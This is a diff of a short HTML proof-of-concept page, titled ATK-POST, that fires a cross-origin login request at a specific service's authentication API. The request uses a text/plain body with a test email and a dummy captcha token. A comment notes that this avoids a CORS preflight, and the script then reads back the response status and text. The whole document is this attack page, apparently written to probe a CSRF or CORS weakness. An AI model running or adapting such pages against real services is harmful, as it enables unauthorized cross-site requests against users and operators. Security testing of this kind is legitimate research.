@@ -1,16 +1,20 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ATK-L2</title></head>
-<body><pre id="out">L-START</pre>
+<html><head><meta charset="utf-8"><title>ATK-POST</title></head>
+<body><pre id="out">P-START</pre>
 <script>
-try {
-  var xhr = new XMLHttpRequest();
-  xhr.open("POST", "https://widget.swapped.com/api/v1/auth/login", false);
-  xhr.setRequestHeader("Content-Type", "text/plain");
-  xhr.send(JSON.stringify({ email: "clean1795767360@euploading.com", url: "https://widget.swapped.com/" }));
-  document.title = "ATK-L2-" + xhr.status;
-  document.getElementById("out").textContent = "L-RESULT " + xhr.status + " :: " + xhr.responseText.slice(0, 200);
-} catch (e) {
-  document.title = "ATK-L2-ERR";
-  document.getElementById("out").textContent = "L-ERR " + e.message;
-}
+(async () => {
+  try {
+    // simple POST (JSON, no custom headers → no preflight)
+    const r = await fetch("https://dashboard-api.swapped.com/api/v1/auth/login", {
+      method: "POST",
+      headers: { "Content-Type": "text/plain" },
+      body: JSON.stringify({ email: "poc-test@swapped.com", turnstile_token: "XXXX.DUMMY.TOKEN.XXXX" })
+    });
+    document.title = "ATK-P-" + r.status;
+    document.getElementById("out").textContent = "P-RESULT " + r.status + " :: " + (await r.text()).slice(0, 300);
+  } catch (e) {
+    document.title = "ATK-P-ERR";
+    document.getElementById("out").textContent = "P-ERR " + e.message;
+  }
+})();
 </script></body></html>
